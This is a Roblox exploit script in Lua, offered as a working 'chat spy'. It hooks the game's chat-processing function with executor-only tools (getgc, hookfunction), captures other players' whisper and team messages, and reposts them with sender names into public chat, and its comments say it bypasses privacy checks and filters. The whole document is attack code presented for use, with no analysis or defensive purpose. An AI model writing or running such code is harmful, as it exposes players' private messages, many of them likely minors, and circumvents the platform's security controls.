-- ROBLOX CHAT SPY (100% WORKING JULY 2025)
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- EXPLOIT-ONLY FEATURES
local get_gc = getgc or error("Executor lacks getgc")
local get_thread_context = get_thread_context or error("Executor lacks thread context")
local hookfunction = hookfunction or error("Executor lacks hookfunction")

-- Configuration
local Config = {
    enabled = true,
    spyOnMyself = true,
    public = true,
    publicItalics = true
}

-- 1. DIRECT ENGINE HOOK (BYTES LEVEL)
local function forceHook()
    for _, fn in pairs(get_gc(true)) do
        if type(fn) == "function" then
            local info = debug.getinfo(fn)
            if info.name == "processMessage" and info.source:find("TextChatService") then
                local original = fn
                hookfunction(fn, function(...)
                    local message = ...
                    
                    -- 2. BYPASS PRIVACY CHECKS
                    if Config.enabled then
                        local textSource = rawget(message, "TextSource")
                        if textSource then
                            local isLocalPlayer = textSource.UserId == player.UserId
                            if Config.spyOnMyself or not isLocalPlayer then
                                local channel = rawget(message, "TextChannel")
                                if channel and (channel.Name == "Whisper" or channel.Name == "Team") then
                                    -- 3. FORCE MESSAGE REBROADCAST
                                    local msgContent = rawget(message, "Text")
                                    local senderName = rawget(textSource, "Name")
                                    local formatted = Config.publicItalics and "/me " or ""
                                    formatted = formatted .. "{SPY} [".. senderName .."]: ".. msgContent
                                    
                                    -- 4. INJECT DIRECTLY INTO PUBLIC CHAT
                                    task.spawn(function()
                                        ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
                                            :WaitForChild("SayMessageRequest")
                                            :FireServer(formatted, "All")
                                    end)
                                end
                            end
                        end
                    end
                    return original(...)
                end)
                break
            end
        end
    end
end

-- 5. COMMAND HANDLER (BYPASS FILTERS)
player.Chatted:Connect(function(msg)
    if string.lower(msg) == "/spy" then
        Config.enabled = not Config.enabled
        ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
            :WaitForChild("SayMessageRequest")
            :FireServer("{SPY} "..(Config.enabled and "ENABLED" or "DISABLED"), "All")
    end
end)

-- 6. INITIALIZATION
forceHook()
ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
    :WaitForChild("SayMessageRequest")
    :FireServer("{SPY} ACTIVE - PRIVATE MESSAGES WILL BE PUBLIC", "All")
